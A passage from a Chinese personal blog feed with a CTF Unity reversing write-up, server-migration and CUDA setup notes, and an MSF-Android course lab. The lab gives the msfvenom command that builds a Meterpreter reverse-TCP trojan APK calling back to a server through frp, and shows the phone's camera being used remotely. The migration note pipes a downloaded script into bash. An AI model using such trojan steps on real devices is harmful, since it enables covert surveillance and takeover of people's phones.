alt="8.png"></p><p>选中变量右键分析，可以查看在那些地方被调用。<br>我的机器上这个功能有点儿问题，不能找到被赋值处，可以遍历程序结构检查。<br>找到redlist,bluelist,score,hp的赋值和使用代码。</p><p>例如：<br>红球的X和Y坐标被取两位小数并转string相连后加入redlist(string数组)中。<br>在检验状态时，取出来进行抑或，加入状态字符串。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171611755.png" alt="9.png"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171611504.png" alt="10.png"></p><h3 id="打印数据"><a href="#打印数据" class="headerlink" title="打印数据"></a>打印数据</h3><p>由于游戏中景物的坐标不变，只是吃到球的顺序改变，对应到状态字符串中是字符串顺序改变而内容不变。<br>所以我在C0t1Nu30RnOt()中添加了一些代码，打印出每个球坐标的异或值以及月亮、云坐标的异或值。<br>剩下的交由枚举顺序爆破吧。<br>选中类-右键-编辑类-编辑代码-编译-选中左上文件栏-保存模块或保存全部，这样才算完成了dll覆写。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171611859.png" alt="11.png"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171611102.png" alt="13.png"></p><h3 id="枚举状态"><a href="#枚举状态" class="headerlink" title="枚举状态"></a>枚举状态</h3><p>不必把球吃完，也没有提示不吃蓝球，所以枚举数量很大。<br>满打满算是10选10的全排列+10选9的全排列+…+10选0的全排列。<br>由当前枚举到的状态可以计算score值，但还需枚举hp值。<br>从游戏玩家的角度出发，自然希望吃完红球，不吃蓝球，不碰怪，hp和score都是max。<br>可以由此指定搜索策略。<br>然而我失败了，不管是优先搜索还是全面暴力都没有结果。<br>至此，不由得对比赛时段内就做出来的dalao们献上膝盖。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171611943.png" alt="12.png"></p><h3 id="坐等官方WP来看看哪儿出了问题。"><a href="#坐等官方WP来看看哪儿出了问题。" class="headerlink" title="坐等官方WP来看看哪儿出了问题。"></a>坐等官方WP来看看哪儿出了问题。</h3><p>哦，原来是隐藏了一个球，告辞…</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;很久之前，巅峰极客的两个Unity游戏逆向题。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://slient2009.github.io/tags/CTF/"/>
    
    <category term="RE" scheme="http://slient2009.github.io/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>MSF-Android课程实验</title>
    <link href="http://slient2009.github.io/2022/12/18/MSF-Android/"/>
    <id>http://slient2009.github.io/2022/12/18/MSF-Android/</id>
    <published>2022-12-18T05:00:03.000Z</published>
    <updated>2022-12-17T07:59:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>MSF-Android课程实验，使用frp做内网穿透来控制木马。</p><span id="more"></span><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171556008.png" alt="1"></p><h2 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h2><p>在实践课上有布置frp内网穿透（内网到公网）和简单的msf木马使用（木马只能内网通信）的任务。此处将两者结合，把木马链接到服务器上，经过内网穿透在本地控制木马。都是入门级实践。</p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>frp代码下载：<a href="https://github.com/fatedier/frp/releases?tdsourcetag=s_pctim_aiomsg">https://github.com/fatedier/frp/releases?tdsourcetag=s_pctim_aiomsg</a><br>内网 kali虚拟机<br>公网 Ubuntu服务器<br>android手机一台</p><h3 id="部署frps"><a href="#部署frps" class="headerlink" title="部署frps"></a>部署frps</h3><p>到上述链接下载对应代码到服务器和本地。<br>或者使用命令<code>wget https://github.com/fatedier/frp/releases/download/v0.21.0/frp_0.21.0_linux_amd64.tar.gz</code></p><p>解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf frp_0.21.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p>进入目录frp_0.21.0_linux_amd64编辑frps.ini</p><ol><li>vim frps.ini进入编辑，insert键开始编辑，esc键停止编辑，shift+Z+Z保存并退出。</li><li>bind_port是自己设定的frp服务端端口</li><li>vhost_http_port是自己设定的http访问端口。</li><li>执行./frps启动frp服务器端的服务</li></ol><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171556831.png" alt="2"></p><h3 id="配置frpc"><a href="#配置frpc" class="headerlink" title="配置frpc"></a>配置frpc</h3><p>客户端的操作与服务器端类似，具体参数不同而已。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编辑frpc.ini :</span></span><br><span class="line">server_addr = x.x.x.x   #设置公网服务器的ip地址</span><br><span class="line">server_port = 7000</span><br><span class="line">local_ip = 127.0.0.1    #设置本地的ip</span><br><span class="line">local_port = 4444       #内网提供的端口,为后续使用msf，此处监听4444端口</span><br><span class="line">remote_port = 6000   #公网映射的端口</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171557160.png" alt="3"></p><p>执行./frpc启动frpc服务<br>两端服务连接成功的提示</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171557107.png" alt="4"></p><h3 id="利用msf生成一个简单木马"><a href="#利用msf生成一个简单木马" class="headerlink" title="利用msf生成一个简单木马"></a>利用msf生成一个简单木马</h3><pre><code>msfvenom -p android/meterpreter/reverse_tcp lhost=serverIP lport=4444 R &gt; horse.apk</code></pre><p>lhost指向公网服务器ip<br>lport与fpc.ini的remote_port相同</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171557065.png" alt="5"></p><p>确保frp连接畅通，木马安装并开始运行，输入exploit并回车<br>webcam_snap拍摄照片（默认后置摄像头）</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171557534.png" alt="6"></p><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171557869.png" alt="7"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;MSF-Android课程实验，使用frp做内网穿透来控制木马。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>搬家记录</title>
    <link href="http://slient2009.github.io/2022/12/18/Leave/"/>
    <id>http://slient2009.github.io/2022/12/18/Leave/</id>
    <published>2022-12-18T05:00:02.000Z</published>
    <updated>2022-12-17T07:42:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>整理之前的笔记</p><span id="more"></span><p>笔者终于决定把网站搬到外面来，在这个过程中顺手学习到了以下的新东西。</p><h2 id="中国大陆骨干网小记"><a href="#中国大陆骨干网小记" class="headerlink" title="中国大陆骨干网小记"></a>中国大陆骨干网小记</h2><blockquote><p>为了选择合适VPS服务商，但是最后还是因为资金的原因租了原来的商家。</p></blockquote><p>摘自 <a href="https://zhuanlan.zhihu.com/p/64467370">https://zhuanlan.zhihu.com/p/64467370</a><br>参考 <a href="https://www.oldking.net/751.html">https://www.oldking.net/751.html</a></p><h3 id="中国电信"><a href="#中国电信" class="headerlink" title="中国电信"></a>中国电信</h3><p>ChinaNet 163骨干网 提供普通质量的服务，国内访问还算OK（但是晚上的体验令人动容），一要出国就不行了，因为承载了大部分电信用户的流量。</p><p>ChinaNet Next Carrying Network(CN2)能够同时承载语音、数据、视频、全球互联等业务，尤其是全球互联方面，相对于 163 网而言，CN2 低丢包、低延时、轻负载。</p><p>回国或出国，必定经过北京/上海/广州。（乌鲁木齐走中亚，此处忽略）</p><p>进出口路由路径，分为三个级别：</p><ol><li><p>163 网（CN1）[AS4134 202.97.*.*]来回都通过CN1到北上广出国</p></li><li><p>CN2 GT（Global Transfer 又称半程 CN2 ）例如去时直接上CN2出国，但是回来的流量进入国内就走CN1，比较好的解决方案是去时走CN1回来走CN2，毕竟总是回来的流量大一些。</p></li><li><p>CN2 GIA（Global Internet Access 又称纯 CN2/全程 CN2）全程CN2，直接就近进入CN2网络，有的地区没有CN2接入点只能找相邻的地区。体验很好也很贵。</p><p>[CN2 AS4809 59.43.*.*]</p></li></ol><h3 id="中国联通"><a href="#中国联通" class="headerlink" title="中国联通"></a>中国联通</h3><p>[169网络 AS4837 219.158.*.*]</p><p>[A网 AS9929 218.105.*.*/210.*.*.*]</p><p>169 网络和 A 网之间的区别，与 163 网络和 CN2 之间的区别并不是一个概念，<strong>A 网</strong>早在中国网通时代就已存在，<strong>属于中国网通的骨干网</strong>。在网通和联通合并后，联通仍继续建设当年从电信 163 网分出来的那一部分，即现如今的 169 网(分出来的原因是应当年政企分离的要求，不是电信自己分的)，而这张 A 网就闲置了。虽然该产品的定位，名义上和中国电信的 CN2 网络对标，但这张“吃老本”的 <strong>A 网所具备的优势仅仅是用户少，网络负荷小</strong>，所以表现也还不错，一般给政企、高端用户使用。但由于这张网络多年没有再发展，所以跟持续扩容的 CN2 比，质量方面的差距只会越来越大。</p><h3 id="中国移动"><a href="#中国移动" class="headerlink" title="中国移动"></a>中国移动</h3><p>[AS9808 ]承载移动的大部分流量，其中又以广州承载移动的大部分出海流量，从这里访问东南亚的体验仅次于CN2 GIA。</p><p>[旧铁通 AS9314几乎被废弃]</p><p><img src="https://i.loli.net/2020/08/30/9wpkUIZ5fRHhqBd.png" alt="image-20200709231854563"></p><p><img src="https://i.loli.net/2020/08/30/drlMVAT2SwcaoyF.png" alt="image-20200709231911112"></p><p><img src="https://i.loli.net/2020/08/30/hadTzuGIEmyrtSM.png" alt="image-20200709231959048"></p><p><img src="https://i.loli.net/2020/08/30/8KgGRpEMfQ6m91j.png" alt="image-20200709232011617"></p><h2 id="安装V2Ray"><a href="#安装V2Ray" class="headerlink" title="安装V2Ray"></a>安装V2Ray</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br></pre></td></tr></table></figure><h3 id="记录信息"><a href="#记录信息" class="headerlink" title="记录信息"></a>记录信息</h3><p>PORT:11451<br>UUID:b7328fb8-da6d-497e-b2b7-a9114514123e</p><h3 id="启动并检查状态"><a href="#启动并检查状态" class="headerlink" title="启动并检查状态"></a>启动并检查状态</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start v2ray[systemctl v2ray start]</span><br><span class="line">systemctl status v2ray[systemctl v2ray status]</span><br></pre></td></tr></table></figure><h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p>当然可以直接drop firewall，这里稳健一点儿，把刚刚使用的端口开放就好</p><h3 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h3><p><img src="https://i.loli.net/2020/08/30/8jokdYquvH9NZ43.png" alt="image-20200710173624031"></p><h3 id="google-BBR加速"><a href="#google-BBR加速" class="headerlink" title="google-BBR加速"></a>google-BBR加速</h3><p>事实上，版本稍微高一点儿的内核就已经包括了BBR，只需要打开就好。</p><h4 id="开启方法"><a href="#开启方法" class="headerlink" title="开启方法"></a>开启方法</h4><p><a href="https://blog.sprov.xyz/2019/02/04/bbr-tcp-faster/">https://blog.sprov.xyz/2019/02/04/bbr-tcp-faster/</a><br><a href="https://www.cnblogs.com/sunylat/p/9521881.html">https://www.cnblogs.com/sunylat/p/9521881.html</a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><a href="http://www.taohui.pub/2019/08/07/%E4%B8%80%E6%96%87%E8%A7%A3%E9%87%8A%E6%B8%85%E6%A5%9Agoogle-bbr%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/">http://www.taohui.pub/2019/08/07/%E4%B8%80%E6%96%87%E8%A7%A3%E9%87%8A%E6%B8%85%E6%A5%9Agoogle-bbr%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/</a></p><h4 id="利用国内VPS中转加速"><a href="#利用国内VPS中转加速" class="headerlink" title="利用国内VPS中转加速"></a>利用国内VPS中转加速</h4><p><a href="https://hijk.pp.ua/forward-traffic-via-internal-vps/">https://hijk.pp.ua/forward-traffic-via-internal-vps/</a></p><h2 id="Typecho搬家"><a href="#Typecho搬家" class="headerlink" title="Typecho搬家"></a>Typecho搬家</h2><blockquote><p>显然现在转投Github了</p></blockquote><ol><li><p>我先在新的机器上安装了宝塔，只是个人博客的话，就选极速安装推荐配置吧，否则要等编译两三个小时。</p><p>​    宝塔安装 <a href="https://www.bt.cn/download/linux.html">https://www.bt.cn/download/linux.html</a></p><p>​    宝塔添加站点 <a href="https://boke112.com/6675.html">https://boke112.com/6675.html</a></p><p>​    整个域名 <a href="https://zhuanlan.zhihu.com/p/33921436">https://zhuanlan.zhihu.com/p/33921436</a></p><p>​    安装Typecho <a href="https://zhuanlan.zhihu.com/p/34211709">https://zhuanlan.zhihu.com/p/34211709</a></p></li><li><p>在新的机器上先搭建好一个新的Typecho博客，数据库名称和原博客相同。(也可以不必先纠结于此，可以后面在配置文件中修改)</p></li><li><p>备份原来博客的usr目录。  <code>tar zcvf usr.tar.gz usr</code>  (注意是站点的usr而不是系统的usr)</p></li><li><p>将备份的博客usr目录，上传到新机器覆盖原来的usr目录。(同样注意是站点的usr目录，不是系统的)。</p></li><li><p>备份mysql数据库。 <code>mysqldump -uroot -p --all-databases &gt; sqlfile.sql</code></p></li><li><p>将备份的数据库文件上传到新机器，并将备份的数据库导入到新机器的mysql中。<code>mysql -uroot -p &lt;sqlfile.sql</code> </p></li><li><p>如果有Database Error，可以检查配置文件是不是和原来站点的配置一样。特别注意一下数据库前缀，因为当初设置的可能已经忘了。<br>配置文件路径 /www/wwwroot/myblogsite/conf.inc.php</p></li></ol><p><img src="https://i.loli.net/2020/08/30/81B7l3ZyqWoDREM.png" alt="image-20200711215249553"></p><h3 id="配置SSL证书"><a href="#配置SSL证书" class="headerlink" title="配置SSL证书"></a>配置SSL证书</h3><p>宝塔是世界上最好的控制面板！没有之一，SSL直接上，不用自己手动去搞letsencrypt certonly….</p><p>   <img src="https://i.loli.net/2020/08/30/vBTUetWRKCIH6ao.png" alt="image-20200830110325826"></p><h3 id="不安全的小锁"><a href="#不安全的小锁" class="headerlink" title="不安全的小锁"></a>不安全的小锁</h3><p><img src="https://i.loli.net/2020/08/30/j3GQmtfA7l6wsOq.png" alt="image-20200830110357569"></p><p>因为数据是直接搬过来的，所以页面里面引用的图片等资源还是指向的原来的站点，而原来的站点是没有SSL的，那么虽然现在的站点配置了SSL但是部分内容引用的是未SSL网站的内容，是为混合内容，小锁失效。</p><p><img src="https://i.loli.net/2020/08/30/wMbGA2SK9Qsez1H.png" alt="image-20200713140431556"></p><p>解决的方法就是改成现在站点的。<br>内容不多倒是可以手动改(还好现在就是这样)<br>要是文章多的话就只好写写脚本吧</p><h3 id="Post-to-google"><a href="#Post-to-google" class="headerlink" title="Post to google"></a>Post to google</h3><p>把网站提交给Google满足以下访问量的虚荣心，但是没想到它事儿还挺多。</p><p><a href="https://search.google.com/search-console/welcome?utm_source=wmx&amp;utm_medium=deprecation-pane&amp;utm_content=home">https://search.google.com/search-console/welcome?utm_source=wmx&amp;utm_medium=deprecation-pane&amp;utm_content=home</a></p><p>TXT解析慢得要死，明天再来。<br>或者选择html文件验证。</p><h2 id="VScode-remote-远程开发免密钥"><a href="#VScode-remote-远程开发免密钥" class="headerlink" title="VScode remote 远程开发免密钥"></a>VScode remote 远程开发免密钥</h2><blockquote><p>这个是真的方便，后面ssh和VScode都不用输密码，注意保护好密钥文件。</p></blockquote><p><a href="https://blog.csdn.net/qq_41554005/article/details/103103443">https://blog.csdn.net/qq_41554005/article/details/103103443</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd&gt; ssh-keygen -t rsa -b <span class="number">4096</span> </span><br><span class="line"><span class="comment"># 生成id_rsa.pub公钥文件和id_rsa私钥文件。（文件会生成在cmd当前目录下）</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/30/48PW25o9AhTVaMK.png" alt="image-20200714204419522"></p><p>把公钥pub上传到服务器，保存为/home/user/.ssh/authorized_key。<br>修改authorized_key权限为600，修改.ssh目录权限为700。</p><p>本地VScode配置文件中编辑</p><p><img src="https://i.loli.net/2020/08/30/ihf7PHbTepVO1aE.png" alt="image-20200714204233712"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;整理之前的笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="配置" scheme="http://slient2009.github.io/tags/%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>搬家记录</title>
    <link href="http://slient2009.github.io/2022/12/18/Move-To-Hexo/"/>
    <id>http://slient2009.github.io/2022/12/18/Move-To-Hexo/</id>
    <published>2022-12-18T05:00:02.000Z</published>
    <updated>2022-12-17T07:42:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>整理之前的笔记</p><span id="more"></span><p>笔者终于决定把网站搬到外面来，在这个过程中顺手学习到了以下的新东西。</p><h2 id="中国大陆骨干网小记"><a href="#中国大陆骨干网小记" class="headerlink" title="中国大陆骨干网小记"></a>中国大陆骨干网小记</h2><blockquote><p>为了选择合适VPS服务商，但是最后还是因为资金的原因租了原来的商家。</p></blockquote><p>摘自 <a href="https://zhuanlan.zhihu.com/p/64467370">https://zhuanlan.zhihu.com/p/64467370</a><br>参考 <a href="https://www.oldking.net/751.html">https://www.oldking.net/751.html</a></p><h3 id="中国电信"><a href="#中国电信" class="headerlink" title="中国电信"></a>中国电信</h3><p>ChinaNet 163骨干网 提供普通质量的服务，国内访问还算OK（但是晚上的体验令人动容），一要出国就不行了，因为承载了大部分电信用户的流量。</p><p>ChinaNet Next Carrying Network(CN2)能够同时承载语音、数据、视频、全球互联等业务，尤其是全球互联方面，相对于 163 网而言，CN2 低丢包、低延时、轻负载。</p><p>回国或出国，必定经过北京/上海/广州。（乌鲁木齐走中亚，此处忽略）</p><p>进出口路由路径，分为三个级别：</p><ol><li><p>163 网（CN1）[AS4134 202.97.*.*]来回都通过CN1到北上广出国</p></li><li><p>CN2 GT（Global Transfer 又称半程 CN2 ）例如去时直接上CN2出国，但是回来的流量进入国内就走CN1，比较好的解决方案是去时走CN1回来走CN2，毕竟总是回来的流量大一些。</p></li><li><p>CN2 GIA（Global Internet Access 又称纯 CN2/全程 CN2）全程CN2，直接就近进入CN2网络，有的地区没有CN2接入点只能找相邻的地区。体验很好也很贵。</p><p>[CN2 AS4809 59.43.*.*]</p></li></ol><h3 id="中国联通"><a href="#中国联通" class="headerlink" title="中国联通"></a>中国联通</h3><p>[169网络 AS4837 219.158.*.*]</p><p>[A网 AS9929 218.105.*.*/210.*.*.*]</p><p>169 网络和 A 网之间的区别，与 163 网络和 CN2 之间的区别并不是一个概念，<strong>A 网</strong>早在中国网通时代就已存在，<strong>属于中国网通的骨干网</strong>。在网通和联通合并后，联通仍继续建设当年从电信 163 网分出来的那一部分，即现如今的 169 网(分出来的原因是应当年政企分离的要求，不是电信自己分的)，而这张 A 网就闲置了。虽然该产品的定位，名义上和中国电信的 CN2 网络对标，但这张“吃老本”的 <strong>A 网所具备的优势仅仅是用户少，网络负荷小</strong>，所以表现也还不错，一般给政企、高端用户使用。但由于这张网络多年没有再发展，所以跟持续扩容的 CN2 比，质量方面的差距只会越来越大。</p><h3 id="中国移动"><a href="#中国移动" class="headerlink" title="中国移动"></a>中国移动</h3><p>[AS9808 ]承载移动的大部分流量，其中又以广州承载移动的大部分出海流量，从这里访问东南亚的体验仅次于CN2 GIA。</p><p>[旧铁通 AS9314几乎被废弃]</p><p><img src="https://i.loli.net/2020/08/30/9wpkUIZ5fRHhqBd.png" alt="image-20200709231854563"></p><p><img src="https://i.loli.net/2020/08/30/drlMVAT2SwcaoyF.png" alt="image-20200709231911112"></p><p><img src="https://i.loli.net/2020/08/30/hadTzuGIEmyrtSM.png" alt="image-20200709231959048"></p><p><img src="https://i.loli.net/2020/08/30/8KgGRpEMfQ6m91j.png" alt="image-20200709232011617"></p><h2 id="安装V2Ray"><a href="#安装V2Ray" class="headerlink" title="安装V2Ray"></a>安装V2Ray</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br></pre></td></tr></table></figure><h3 id="记录信息"><a href="#记录信息" class="headerlink" title="记录信息"></a>记录信息</h3><p>PORT:11451<br>UUID:b7328fb8-da6d-497e-b2b7-a9114514123e</p><h3 id="启动并检查状态"><a href="#启动并检查状态" class="headerlink" title="启动并检查状态"></a>启动并检查状态</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start v2ray[systemctl v2ray start]</span><br><span class="line">systemctl status v2ray[systemctl v2ray status]</span><br></pre></td></tr></table></figure><h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p>当然可以直接drop firewall，这里稳健一点儿，把刚刚使用的端口开放就好</p><h3 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h3><p><img src="https://i.loli.net/2020/08/30/8jokdYquvH9NZ43.png" alt="image-20200710173624031"></p><h3 id="google-BBR加速"><a href="#google-BBR加速" class="headerlink" title="google-BBR加速"></a>google-BBR加速</h3><p>事实上，版本稍微高一点儿的内核就已经包括了BBR，只需要打开就好。</p><h4 id="开启方法"><a href="#开启方法" class="headerlink" title="开启方法"></a>开启方法</h4><p><a href="https://blog.sprov.xyz/2019/02/04/bbr-tcp-faster/">https://blog.sprov.xyz/2019/02/04/bbr-tcp-faster/</a><br><a href="https://www.cnblogs.com/sunylat/p/9521881.html">https://www.cnblogs.com/sunylat/p/9521881.html</a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><a href="http://www.taohui.pub/2019/08/07/%E4%B8%80%E6%96%87%E8%A7%A3%E9%87%8A%E6%B8%85%E6%A5%9Agoogle-bbr%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/">http://www.taohui.pub/2019/08/07/%E4%B8%80%E6%96%87%E8%A7%A3%E9%87%8A%E6%B8%85%E6%A5%9Agoogle-bbr%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/</a></p><h4 id="利用国内VPS中转加速"><a href="#利用国内VPS中转加速" class="headerlink" title="利用国内VPS中转加速"></a>利用国内VPS中转加速</h4><p><a href="https://hijk.pp.ua/forward-traffic-via-internal-vps/">https://hijk.pp.ua/forward-traffic-via-internal-vps/</a></p><h2 id="Typecho搬家"><a href="#Typecho搬家" class="headerlink" title="Typecho搬家"></a>Typecho搬家</h2><blockquote><p>显然现在转投Github了</p></blockquote><ol><li><p>我先在新的机器上安装了宝塔，只是个人博客的话，就选极速安装推荐配置吧，否则要等编译两三个小时。</p><p>​    宝塔安装 <a href="https://www.bt.cn/download/linux.html">https://www.bt.cn/download/linux.html</a></p><p>​    宝塔添加站点 <a href="https://boke112.com/6675.html">https://boke112.com/6675.html</a></p><p>​    整个域名 <a href="https://zhuanlan.zhihu.com/p/33921436">https://zhuanlan.zhihu.com/p/33921436</a></p><p>​    安装Typecho <a href="https://zhuanlan.zhihu.com/p/34211709">https://zhuanlan.zhihu.com/p/34211709</a></p></li><li><p>在新的机器上先搭建好一个新的Typecho博客，数据库名称和原博客相同。(也可以不必先纠结于此，可以后面在配置文件中修改)</p></li><li><p>备份原来博客的usr目录。  <code>tar zcvf usr.tar.gz usr</code>  (注意是站点的usr而不是系统的usr)</p></li><li><p>将备份的博客usr目录，上传到新机器覆盖原来的usr目录。(同样注意是站点的usr目录，不是系统的)。</p></li><li><p>备份mysql数据库。 <code>mysqldump -uroot -p --all-databases &gt; sqlfile.sql</code></p></li><li><p>将备份的数据库文件上传到新机器，并将备份的数据库导入到新机器的mysql中。<code>mysql -uroot -p &lt;sqlfile.sql</code> </p></li><li><p>如果有Database Error，可以检查配置文件是不是和原来站点的配置一样。特别注意一下数据库前缀，因为当初设置的可能已经忘了。<br>配置文件路径 /www/wwwroot/myblogsite/conf.inc.php</p></li></ol><p><img src="https://i.loli.net/2020/08/30/81B7l3ZyqWoDREM.png" alt="image-20200711215249553"></p><h3 id="配置SSL证书"><a href="#配置SSL证书" class="headerlink" title="配置SSL证书"></a>配置SSL证书</h3><p>宝塔是世界上最好的控制面板！没有之一，SSL直接上，不用自己手动去搞letsencrypt certonly….</p><p>   <img src="https://i.loli.net/2020/08/30/vBTUetWRKCIH6ao.png" alt="image-20200830110325826"></p><h3 id="不安全的小锁"><a href="#不安全的小锁" class="headerlink" title="不安全的小锁"></a>不安全的小锁</h3><p><img src="https://i.loli.net/2020/08/30/j3GQmtfA7l6wsOq.png" alt="image-20200830110357569"></p><p>因为数据是直接搬过来的，所以页面里面引用的图片等资源还是指向的原来的站点，而原来的站点是没有SSL的，那么虽然现在的站点配置了SSL但是部分内容引用的是未SSL网站的内容，是为混合内容，小锁失效。</p><p><img src="https://i.loli.net/2020/08/30/wMbGA2SK9Qsez1H.png" alt="image-20200713140431556"></p><p>解决的方法就是改成现在站点的。<br>内容不多倒是可以手动改(还好现在就是这样)<br>要是文章多的话就只好写写脚本吧</p><h3 id="Post-to-google"><a href="#Post-to-google" class="headerlink" title="Post to google"></a>Post to google</h3><p>把网站提交给Google满足以下访问量的虚荣心，但是没想到它事儿还挺多。</p><p><a href="https://search.google.com/search-console/welcome?utm_source=wmx&amp;utm_medium=deprecation-pane&amp;utm_content=home">https://search.google.com/search-console/welcome?utm_source=wmx&amp;utm_medium=deprecation-pane&amp;utm_content=home</a></p><p>TXT解析慢得要死，明天再来。<br>或者选择html文件验证。</p><h2 id="VScode-remote-远程开发免密钥"><a href="#VScode-remote-远程开发免密钥" class="headerlink" title="VScode remote 远程开发免密钥"></a>VScode remote 远程开发免密钥</h2><blockquote><p>这个是真的方便，后面ssh和VScode都不用输密码，注意保护好密钥文件。</p></blockquote><p><a href="https://blog.csdn.net/qq_41554005/article/details/103103443">https://blog.csdn.net/qq_41554005/article/details/103103443</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd&gt; ssh-keygen -t rsa -b <span class="number">4096</span> </span><br><span class="line"><span class="comment"># 生成id_rsa.pub公钥文件和id_rsa私钥文件。（文件会生成在cmd当前目录下）</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/30/48PW25o9AhTVaMK.png" alt="image-20200714204419522"></p><p>把公钥pub上传到服务器，保存为/home/user/.ssh/authorized_key。<br>修改authorized_key权限为600，修改.ssh目录权限为700。</p><p>本地VScode配置文件中编辑</p><p><img src="https://i.loli.net/2020/08/30/ihf7PHbTepVO1aE.png" alt="image-20200714204233712"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;整理之前的笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="配置" scheme="http://slient2009.github.io/tags/%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>今晚，我安装好了CUDA+PyCUDA+Anaconda</title>
    <link href="http://slient2009.github.io/2022/12/18/Install-CUDA/"/>
    <id>http://slient2009.github.io/2022/12/18/Install-CUDA/</id>
    <published>2022-12-18T05:00:01.000Z</published>
    <updated>2022-12-17T07:36:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>整理之前的笔记</p><span id="more"></span><p><img src="https://i.loli.net/2020/11/20/IBMFVHb81kUNY9j.jpg" alt="11"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>未来一段时间要用python在GPU上写一些代码，需要安装python+CUDA。<br>但是却在环境问题上耽误了大概两周的样子，修了又修，接近自闭。<br>今晚终于在Jing老师和LCX的帮助下解决了。<br>怎么想都想不到竟然是分号的问题？！<br>本文安装步骤来自LCX的安装文档，再加上Jing老师的指导，笔者主要是在记录详细过程。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Anaconda-python"><a href="#Anaconda-python" class="headerlink" title="Anaconda-python"></a>Anaconda-python</h3><p>预先安装的python就不要了，用anaconda提供的python。<br>anaconda会提供一些常用的工具包，在它下面运行python会比较方便(LCX语)。<br>从官网下载安装包默认安装即可，建议在安装时将它添加到环境变量中方便使用。</p><p><img src="https://i.loli.net/2020/11/20/PtvUm5qdyRW4gO3.png" alt="22"></p><p>然后在anaconda prompt中安装pycuda<br>conda install pycuda 或者 pip install pycuda</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171526277.png"></p><h3 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h3><p>不必用VS编写代码，这里用的是它的VC++的一些发行版本。<br>笔者在头铁尝试VS2017碰壁后灰溜溜回到VS2015。<br>虽然没有直接证据证明VS2017不行，但综合网上文章和朋友的经验，还是VS2015稳一点。<br>当然，有可能会用到VC2015的一个修复版本来解决文件缺失的问题。<br><a 